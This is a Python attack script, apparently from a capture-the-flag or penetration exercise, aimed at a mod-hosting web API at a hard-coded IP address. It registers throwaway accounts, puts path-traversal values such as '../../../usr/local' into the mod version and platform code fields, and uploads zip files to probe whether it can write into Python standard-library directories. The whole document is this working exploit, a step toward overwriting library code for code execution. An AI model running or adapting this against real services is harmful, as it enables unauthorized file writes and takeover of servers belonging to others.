#!/usr/bin/env python3
import requests, sys, io, zipfile, secrets

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://144.79.188.39:42166"
if not BASE.startswith("http"):
    BASE = "http://" + BASE

def fresh():
    u = "u" + secrets.token_hex(4)
    pw = "Pass12345!"
    requests.post(f"{BASE}/api/auth/register/", json={"username": u, "password": pw}, timeout=15)
    r = requests.post(f"{BASE}/api/auth/login/", json={"username": u, "password": pw}, timeout=15)
    return r.json()["access"], u

def H(tok):
    return {"Authorization": f"Bearer {tok}"}

def get_or_create_plat(tok, code, name="z"):
    r = requests.get(f"{BASE}/api/platforms/", headers=H(tok), timeout=15).json()
    for it in (r.get("results", r) if isinstance(r, dict) else r) or []:
        if isinstance(it, dict) and it.get("code") == code:
            return it["id"]
    rp = requests.post(f"{BASE}/api/platforms/", headers=H(tok),
        json={"code": code, "name": name}, timeout=15)
    return rp.json().get("id")

def test_write(mv, pc, filename="test.txt"):
    tok, _ = fresh()
    pid = get_or_create_plat(tok, pc)
    if not pid: return "plat_fail"
    rm = requests.post(f"{BASE}/api/mods/", headers=H(tok),
        json={"title":"z", "mod_version":mv, "release_notes":"", "is_enabled":True}, timeout=15)
    if rm.status_code not in (200, 201): return f"mod_fail_{rm.status_code}"
    mid = rm.json().get("id")
    rb = requests.post(f"{BASE}/api/mods/{mid}/builds/", headers=H(tok),
        json={"platform": pid}, timeout=15)
    if rb.status_code not in (200, 201): return f"build_fail_{rb.status_code}"
    bid = rb.json().get("id")
    
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(filename, b"hello")
    bio.seek(0)
    
    r = requests.post(f"{BASE}/api/mods/{mid}/builds/{bid}/upload/", headers=H(tok),
        files={"zip_file": ("p.zip", bio, "application/zip")}, timeout=30)
    return r.status_code

print(f"[*] Testing candidate paths on {BASE}:")

candidates = [
    ("../../../usr/local", "lib/python3.11/html", "/usr/local/lib/python3.11/html"),
    ("../../../usr/local", "lib/python3.11/dbm", "/usr/local/lib/python3.11/dbm"),
    ("../../../usr/local", "lib/python3.11/xml", "/usr/local/lib/python3.11/xml"),
    ("../../../usr/local", "lib/python3.11/http", "/usr/local/lib/python3.11/http"),
    ("../../../usr/local", "lib/python3.11/json", "/usr/local/lib/python3.11/json"),
    ("../../../usr/local", "lib/python3.11/email", "/usr/local/lib/python3.11/email"),
]

for mv, pc, desc in candidates:
    res = test_write(mv, pc)
    print(f"  {desc} (mv={mv}, pc={pc}) -> {res}")
